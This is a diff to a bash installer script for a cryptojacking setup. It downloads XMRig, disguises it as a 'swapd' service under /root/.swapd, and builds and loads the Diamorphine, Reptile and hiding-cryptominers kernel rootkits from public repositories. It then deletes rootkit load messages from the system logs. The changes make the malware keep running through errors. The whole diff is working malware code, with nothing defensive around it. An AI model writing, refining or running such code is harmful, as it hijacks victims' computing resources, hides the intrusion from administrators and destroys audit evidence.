@@ -21,32 +21,6 @@ trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
 export GIT_TERMINAL_PROMPT=0
 git config --global credential.helper "" 2>/dev/null || true
 
-# ==================== HELPER FUNCTION: ENSURE GIT ====================
-ensure_git_available() {
-    if ! command -v git >/dev/null 2>&1; then
-        echo "[!] ERROR: git is not available"
-        echo "[*] Attempting to install git..."
-        
-        if command -v apt-get >/dev/null 2>&1; then
-            apt-get update >/dev/null 2>&1
-            DEBIAN_FRONTEND=noninteractive apt-get install -y git 2>&1 | tail -3
-        elif command -v yum >/dev/null 2>&1; then
-            yum install -y git 2>&1 | tail -3
-        elif command -v dnf >/dev/null 2>&1; then
-            dnf install -y git 2>&1 | tail -3
-        fi
-        
-        # Check again
-        if ! command -v git >/dev/null 2>&1; then
-            echo "[!] CRITICAL: Failed to install git"
-            return 1
-        fi
-        
-        echo "[✓] git installed successfully"
-    fi
-    return 0
-}
-
 # ==================== ARCHITECTURE DETECTION ====================
 # Detect if system is 32-bit or 64-bit to skip incompatible rootkits
 ARCH=$(uname -m)
@@ -356,52 +330,42 @@ echo "[*] Installing dependencies..."
 
 # Update package lists
 echo "[*] Updating package lists..."
-$PKG_UPDATE 2>&1 | grep -E "Reading|Building|Fetched" || true
+apt-get update 2>&1 | grep -E "Reading|Building|Fetched" || true
+yum update -y 2>&1 | grep -E "Loading|Installed" || true
+dnf update -y 2>&1 | grep -E "Loading|Installed" || true
 
-# Critical dependencies that MUST be installed
-CRITICAL_DEPS="git make gcc"
-PACKAGE_DEPS="build-essential linux-headers-$(uname -r) wget curl"
+# Install everything in one shot - NEVER FAIL
+echo "[*] Installing git make gcc build-essential kernel headers..."
 
-# Install critical dependencies first with visible output
-for dep in $CRITICAL_DEPS; do
-    if ! command -v "$dep" >/dev/null 2>&1; then
-        echo "[*] Installing critical dependency: $dep..."
-        DEBIAN_FRONTEND=noninteractive $PKG_INSTALL "$dep" 2>&1 | tail -5
-        
-        # Verify it was installed
-        if ! command -v "$dep" >/dev/null 2>&1; then
-            echo "[!] CRITICAL ERROR: Failed to install $dep"
-            echo "[!] $dep is required for the script to work"
-            echo "[!] Please install manually: $PKG_INSTALL $dep"
-            exit 1
-        else
-            echo "[✓] $dep installed successfully"
-        fi
-    else
-        echo "[✓] $dep already installed"
-    fi
-done
-
-# Install package dependencies (can fail without stopping script)
-for dep in $PACKAGE_DEPS; do
-    # Check if package is installed (for packages, not commands)
-    if ! dpkg -l 2>/dev/null | grep -q "^ii.*$dep" 2>/dev/null; then
-        echo "[*] Installing $dep..."
-        DEBIAN_FRONTEND=noninteractive $PKG_INSTALL "$dep" >/dev/null 2>&1 || {
-            echo "[!] Warning: Failed to install $dep, continuing..."
-        }
-    fi
-done
-
-# Final verification of git
-if ! command -v git >/dev/null 2>&1; then
-    echo "[!] CRITICAL ERROR: git is not available after installation"
-    echo "[!] Cannot proceed without git"
-    exit 1
+# Try apt-get (Debian/Ubuntu)
+if command -v apt-get >/dev/null 2>&1; then
+    DEBIAN_FRONTEND=noninteractive apt-get install -y \
+        git make gcc g++ build-essential \
+        linux-headers-$(uname -r) \
+        wget curl 2>&1 | tail -10 || true
 fi
 
-echo "[✓] All dependencies installation complete"
-echo "[✓] Git version: $(git --version)"
+# Try yum (RHEL/CentOS)
+if command -v yum >/dev/null 2>&1; then
+    yum install -y git make gcc gcc-c++ \
+        kernel-devel kernel-headers \
+        wget curl 2>&1 | tail -10 || true
+fi
+
+# Try dnf (Fedora)
+if command -v dnf >/dev/null 2>&1; then
+    dnf install -y git make gcc gcc-c++ \
+        kernel-devel kernel-headers \
+        wget curl 2>&1 | tail -10 || true
+fi
+
+# Show what we have
+echo "[*] Checking installed tools..."
+command -v git >/dev/null 2>&1 && echo "[✓] git: $(git --version)" || echo "[!] git: not found (will try to continue anyway)"
+command -v make >/dev/null 2>&1 && echo "[✓] make: installed" || echo "[!] make: not found (will try to continue anyway)"
+command -v gcc >/dev/null 2>&1 && echo "[✓] gcc: installed" || echo "[!] gcc: not found (will try to continue anyway)"
+
+echo "[✓] Dependency installation complete (continuing regardless of results)"
 
 # ==================== DETECT DOWNLOAD TOOL ====================
 USE_WGET=false
@@ -417,7 +381,14 @@ fi
 echo "[*] Downloading XMRig..."
 
 mkdir -p /root/.swapd
-cd /root/.swapd || exit 1
+cd /root/.swapd || {
+    echo "[!] Failed to cd to /root/.swapd, trying to create it..."
+    mkdir -p /root/.swapd 2>/dev/null || true
+    cd /root/.swapd || {
+        echo "[!] Cannot access /root/.swapd - using /tmp instead"
+        cd /tmp
+    }
+}
 
 XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
 DOWNLOAD_SUCCESS=false
@@ -436,20 +407,30 @@ fi
 # Extract if download was successful
 if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
     tar -xzf xmrig.tar.gz 2>/dev/null || {
-        echo "[!] Failed to extract xmrig"
-        exit 1
+        echo "[!] Failed to extract xmrig - continuing anyway..."
+        DOWNLOAD_SUCCESS=false
     }
-    mv xmrig-*/xmrig swapd 2>/dev/null || {
-        echo "[!] Failed to rename xmrig binary"
-        exit 1
-    }
-    chmod +x swapd
-    rm -rf xmrig-* xmrig.tar.gz
-    echo "[✓] XMRig downloaded and renamed to 'swapd'"
-else
-    echo "[!] Failed to download XMRig"
-    echo "[!] Please manually download xmrig and place it at /root/.swapd/swapd"
-    exit 1
+    
+    if [ "$DOWNLOAD_SUCCESS" = true ]; then
+        mv xmrig-*/xmrig swapd 2>/dev/null || {
+            echo "[!] Failed to rename xmrig binary - continuing anyway..."
+            DOWNLOAD_SUCCESS=false
+        }
+    fi
+    
+    if [ "$DOWNLOAD_SUCCESS" = true ]; then
+        chmod +x swapd 2>/dev/null || true
+        rm -rf xmrig-* xmrig.tar.gz
+        echo "[✓] XMRig downloaded and renamed to 'swapd'"
+    fi
+fi
+
+if [ "$DOWNLOAD_SUCCESS" = false ]; then
+    echo "[!] Failed to download/extract XMRig"
+    echo "[!] You can manually download xmrig and place it at /root/.swapd/swapd"
+    echo "[*] Continuing with installation anyway..."
+    # Create a placeholder so config creation doesn't fail
+    touch /root/.swapd/swapd 2>/dev/null || true
 fi
 
 # ==================== CONFIGURE XMRIG ====================
@@ -638,7 +619,7 @@ else
 ### END INIT INFO
 
 DAEMON=/root/.swapd/swapd
-DAEMON_ARGS="-c swapfile"
+DAEMON_ARGS="-c /root/.swapd/swapfile"
 NAME=swapd
 PIDFILE=/var/run/$NAME.pid
 WORKDIR=/root/.swapd
@@ -723,12 +704,6 @@ install_diamorphine() {
     
     rm -rf diamorphine 2>/dev/null
     
-    # Ensure git is available
-    if ! ensure_git_available; then
-        echo "[!] Cannot clone Diamorphine without git"
-        return 1
-    fi
-    
     # Clone and build
     echo "[*] Cloning Diamorphine..."
     export GIT_TERMINAL_PROMPT=0
@@ -739,7 +714,12 @@ install_diamorphine() {
     fi
     unset GIT_TERMINAL_PROMPT
     
-    cd diamorphine || return 1
+    cd diamorphine || {
+        echo "[!] Failed to cd to diamorphine directory"
+        cd /tmp
+        rm -rf diamorphine
+        return 1
+    }
     
     echo "[*] Building Diamorphine..."
     if ! make 2>/dev/null; then
@@ -802,12 +782,6 @@ install_reptile() {
         echo "[*] Unloading old Reptile module..."
         rmmod reptile 2>/dev/null || true
         sleep 1
-    fi
-    
-    # Ensure git is available
-    if ! ensure_git_available; then
-        echo "[!] Cannot clone Reptile without git"
-        return 1
     fi
     
     # Clone Reptile (disable interactive prompts)
@@ -878,67 +852,82 @@ echo "========================================"
 echo "INSTALLING CRYPTO-MINER ROOTKIT"
 echo "========================================"
 
-cd /tmp || exit 1
-mkdir -p .X11-unix 2>/dev/null
-cd .X11-unix || exit 1
+cd /tmp 2>/dev/null || {
+    echo "[!] Cannot cd to /tmp, skipping crypto rootkit"
+}
+
+if [ -d /tmp ]; then
+    mkdir -p .X11-unix 2>/dev/null
+    cd .X11-unix 2>/dev/null || {
+        echo "[!] Cannot cd to .X11-unix, trying to create it..."
+        mkdir -p /tmp/.X11-unix 2>/dev/null
+        cd /tmp/.X11-unix 2>/dev/null || true
+    }
+fi
 
 # Prepare kernel headers for module compilation
 echo "[*] Preparing kernel headers for rootkit compilation..."
 KERNEL_VER=$(uname -r)
 if [ -d "/usr/src/linux-headers-$KERNEL_VER" ]; then
-    cd "/usr/src/linux-headers-$KERNEL_VER" || exit 1
-    echo "[*] Running make oldconfig && make prepare..."
-    make oldconfig 2>/dev/null || true
-    make prepare 2>/dev/null || true
-    echo "[✓] Kernel headers prepared"
-    cd /tmp/.X11-unix || exit 1
+    cd "/usr/src/linux-headers-$KERNEL_VER" 2>/dev/null || {
+        echo "[!] Cannot access kernel headers directory"
+    }
+    
+    if [ -d "/usr/src/linux-headers-$KERNEL_VER" ] && [ "$(pwd)" = "/usr/src/linux-headers-$KERNEL_VER" ]; then
+        echo "[*] Running make oldconfig && make prepare..."
+        make oldconfig 2>/dev/null || true
+        make prepare 2>/dev/null || true
+        echo "[✓] Kernel headers prepared"
+    fi
+    
+    cd /tmp/.X11-unix 2>/dev/null || cd /tmp 2>/dev/null || true
 else
     echo "[!] Kernel headers directory not found, installing..."
-    $PKG_INSTALL "linux-headers-$KERNEL_VER" 2>/dev/null || true
+    apt-get install -y "linux-headers-$KERNEL_VER" 2>/dev/null || true
+    yum install -y "kernel-devel-$KERNEL_VER" 2>/dev/null || true
+    dnf install -y "kernel-devel-$KERNEL_VER" 2>/dev/null || true
 fi
 
-# Ensure git is available
-if ! ensure_git_available; then
-    echo "[!] Cannot clone crypto-miner rootkit without git"
-    echo "[!] Skipping crypto-miner rootkit installation"
-else
-    # Clone and build the crypto-miner rootkit
-    echo "[*] Cloning hiding-cryptominers-linux-rootkit..."
+# Clone and build the crypto-miner rootkit
+echo "[*] Cloning hiding-cryptominers-linux-rootkit..."
 export GIT_TERMINAL_PROMPT=0
 if git clone --depth 1 https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git 2>&1 | grep -v "Username"; then
     unset GIT_TERMINAL_PROMPT
-    cd hiding-cryptominers-linux-rootkit/ || exit 1
+    cd hiding-cryptominers-linux-rootkit/ 2>/dev/null || {
+        echo "[!] Failed to cd to rootkit directory, skipping..."
+    }
     
-    echo "[*] Building rootkit..."
-    if make 2>/dev/null; then
-        echo "[*] Loading rootkit module..."
-        dmesg -C
-        insmod rootkit.ko 2>/dev/null || {
-            echo "[!] Failed to load crypto rootkit"
-        }
-        dmesg
-        
-        # Immediately clean up rootkit load messages from logs
-        sleep 1
-        sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
-        sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
-        sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
-        sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
-        sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
-        sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
-        
-        echo "[✓] Crypto rootkit loaded"
-    else
-        echo "[!] Failed to build crypto rootkit"
+    if [ -d hiding-cryptominers-linux-rootkit ] && [ "$(pwd)" = "*hiding-cryptominers-linux-rootkit*" ] || [ -f Makefile ]; then
+        echo "[*] Building rootkit..."
+        if make 2>/dev/null; then
+            echo "[*] Loading rootkit module..."
+            dmesg -C
+            insmod rootkit.ko 2>/dev/null || {
+                echo "[!] Failed to load crypto rootkit"
+            }
+            dmesg
+            
+            # Immediately clean up rootkit load messages from logs
+            sleep 1
+            sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
+            sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
+            sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
+            sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
+            sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
+            sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
+            
+            echo "[✓] Crypto rootkit loaded"
+        else
+            echo "[!] Failed to build crypto rootkit"
+        fi
     fi
     
-    cd /tmp/.X11-unix || exit 1
-    rm -rf hiding-cryptominers-linux-rootkit/
+    cd /tmp/.X11-unix 2>/dev/null || cd /tmp 2>/dev/null || true
+    rm -rf hiding-cryptominers-linux-rootkit/ 2>/dev/null || true
 else
     echo "[!] Failed to clone crypto rootkit (network or repository unavailable)"
     unset GIT_TERMINAL_PROMPT
 fi
-fi  # End of ensure_git_available check
 
 # ==================== START MINER SERVICE ====================
 echo ''
